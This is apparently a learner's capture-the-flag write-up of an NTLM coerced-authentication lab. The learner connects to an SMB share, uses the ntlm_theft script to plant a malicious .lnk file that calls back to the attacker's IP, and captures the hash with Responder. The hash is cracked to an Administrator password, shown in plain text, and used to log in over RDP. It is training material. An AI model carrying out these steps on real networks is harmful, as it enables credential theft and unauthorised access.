::: page
# Day 23\_ Coerced Authentication Relay All the Way {#day-23_-coerced-authentication-relay-all-the-way .title}

\

![](images/15-1.png)

![](images/15-2.png)

![](images/15-3.png)

I am having a hard time to connect to SMB, I may need more experience,
these are the commands used

1.  smbclient ////10.10.253.107/ElfShare -U guest
2.  smbclient ////10.10.253.107/ElfShare -U guest%
3.  smbclient \\\\10.10.253.107\\ElfShare -U guest%
4.  smbclient \\\\10.10.253.107\\ElfShare -U guest
5.  smbclient \\\\\\\\10.10.253.107\\ElfShare -U guest
6.  smbclient \\\\\\\\10.10.253.107\\ElfShare -U guest -L
7.  smbclient \\\\\\\\10.10.253.107\\ElfShare -U=guest -L

But this is the only one that worked, I am not sure why

[ smbclient //10.10.253.107/ElfShare/ -U guest
]{style="background-color:#a51d2d;"}

![](images/15-4.png)

and then I procedeed to host a malicious lnk file using the NTLM_theft
python script

here are the commands used

1.  git clone <https://github.com/Greenwolf/ntlm_theft.git>
2.  cd ntlm_theft
3.  chmod +x ntlm_theft.py
4.  python3 ntlm_theft.py -g lnk -s 10.18.70.19 -f bonus

![](images/15-5.png)

![](images/15-6.png)

![](images/15-7.png)

and then I proceede to set up my LLMNR poisoner using the Responder

this is the capture NTLM HASH

![](images/15-8.png)I copied the hash into a text file and crack

as a side note:

I had a hard time to crack the hash because I removed the spaces after
the end\... so next time never remove the space at the end\... okay!!

![](images/15-9.png)

![](images/15-10.png)

Administrator:GreedyGrabber1@

I used xfreerdp to remote to the victim machine to get the flag

xfreerdp /v:10.10.253.107 /u:Administrator /p:GreedyGrabber1@

![](images/15-11.png)
:::
